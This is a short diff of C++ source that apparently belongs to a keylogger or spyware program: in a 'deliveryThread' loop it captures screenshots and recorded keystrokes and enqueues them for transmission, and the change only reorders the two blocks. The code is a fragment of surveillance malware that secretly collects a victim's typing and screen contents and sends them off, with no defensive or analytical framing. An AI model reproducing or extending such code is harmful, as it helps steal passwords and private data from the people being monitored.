@@ -192,11 +192,7 @@ void deliveryThread(DataTransmission &dt,int interval_seconds)
     {
         Sleep(interval_seconds);
 
-        mType = screenshot;
 
-
-        saveToCapturedScreenshot(convertUnsignedCharVectorToString(getScreenshot()));
-        dt.Enqueue(mType,getCapturedScreenshot());
 
 
         mType = keystrokes;
@@ -207,6 +203,13 @@ void deliveryThread(DataTransmission &dt,int interval_seconds)
             dt.Enqueue(mType,s);
             clearRecordedKeystrokes();
         }
+
+
+        mType = screenshot;
+
+
+        saveToCapturedScreenshot(convertUnsignedCharVectorToString(getScreenshot()));
+        dt.Enqueue(mType,getCapturedScreenshot());
 
 
     }
